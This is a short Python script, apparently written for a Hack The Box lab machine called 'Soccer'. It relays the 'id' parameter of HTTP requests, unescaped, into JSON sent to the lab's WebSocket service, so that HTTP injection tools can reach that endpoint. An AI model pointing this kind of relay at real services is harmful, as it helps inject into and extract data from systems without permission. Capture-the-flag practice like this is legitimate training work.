from http.server import *
from urllib.parse import urlparse, parse_qs, unquote
import websocket
from threading import Thread
from os import system



class HTTPRequestsHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        id_ = unquote(parse_qs(urlparse(self.path).query)['id'][0])
        ws = websocket.WebSocket()
        ws.connect("ws://soc-player.soccer.htb:9091")
        data = "{\"id\": \"%s\"}" % id_
        ws.send(data)
        info = ws.recv()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write('<html><head><meta charset="utf-8">'.encode())
        self.wfile.write('<title>Soccer Hack Middle Server</title></head>'.encode())
        self.wfile.write('<body>{}</body></html>'.format(info).encode())


class HackSoccerServer:
    def __init__(self, serv_addr):
        self.server = HTTPServer(serv_addr, HTTPRequestsHandler)
    def run(self):
        while True:
            try:
                self.server.handle_request()
            except KeyboardInterrupt:
                system("clear")
                print("Exitting...")
                self.close()
                
    def close(self):
        self.server.server_close()
        exit(0)

if __name__ == "__main__":
    serv = HackSoccerServer(("localhost", 8000))
    serv.run()
    serv.close()

